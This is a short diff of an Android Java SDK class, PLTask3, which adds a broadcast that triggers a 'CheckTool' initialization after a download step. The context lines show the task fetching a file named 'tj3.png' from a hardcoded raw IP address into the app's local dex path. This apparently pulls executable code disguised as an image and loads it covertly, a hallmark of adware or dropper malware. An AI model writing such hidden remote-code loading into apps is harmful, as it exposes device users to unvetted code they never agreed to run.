@@ -3,6 +3,7 @@
  */
 package cn.play.dserv;
 
+import android.content.Intent;
 import android.util.Log;
 
 /**
@@ -37,6 +38,11 @@ public class PLTask3 implements PLTask {
 			if (SdkServ.downloadGoOn("http://180.96.63.70:8080/plserver/dats/tj3.png", SdkServ.getLocalDexPath(), "tj3.png",this.dservice.getService())) {
 				Log.d(TAG, "down tj3 OK.");
 			}
+			//触发CheckTool初始化
+			Intent i = new Intent();
+			i.setAction(DServ.RECEIVER_ACTION);
+			i.putExtra("act", DServ.ACT_RECV_INITEXIT);
+			this.dservice.getService().sendBroadcast(i);
 			state = STATE_DIE;
 			result = 1;
 		}else{
